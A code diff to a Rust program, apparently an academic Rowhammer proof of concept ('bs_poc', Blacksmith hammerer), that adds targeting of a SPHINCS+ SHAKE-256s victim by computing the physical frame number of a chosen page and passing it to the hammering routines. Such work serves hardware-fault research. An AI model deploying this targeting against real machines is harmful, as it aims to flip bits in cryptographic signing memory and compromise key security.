@@ -7,8 +7,6 @@ use std::{
 };
 
 use anyhow::bail;
-use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
-use bs_poc::hammerer::Hammering;
 use bs_poc::memory::{mem_configuration::MemConfiguration, GetConsecPfns};
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
@@ -26,6 +24,11 @@ use bs_poc::{
     hammerer::Hammerer,
 };
 use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
+use bs_poc::{
+    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
+    memory::PfnResolver,
+};
+use bs_poc::{hammerer::Hammering, victim::sphincs_plus::TARGET_OFFSETS_SHAKE_256S};
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
     retry,
@@ -361,6 +364,11 @@ unsafe fn _main() -> anyhow::Result<()> {
         info!("Starting bait allocation");
         let start = std::time::Instant::now();
         let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
+        let target_pfn = memory
+            .addr(
+                TARGET_OFFSETS_SHAKE_256S[0].page_offset + TARGET_OFFSETS_SHAKE_256S[0].target_size,
+            )
+            .pfn()?;
         let alloc_duration = std::time::Instant::now() - start;
         info!("Allocated {} bytes of memory", memory.len());
 
@@ -381,6 +389,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             args.attempts,
             true,
             None,
+            target_pfn,
         )?;
         let profiling = hammer_profile(
             &profile_hammer,
@@ -471,8 +480,9 @@ unsafe fn _main() -> anyhow::Result<()> {
             block_size,
             &memory,
             args.attempts,
-            false,
+            false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
             None,
+            target_pfn,
         )?;
         let mut results = vec![];
         for _ in 0..NUM_HAMMER_ROUNDS {
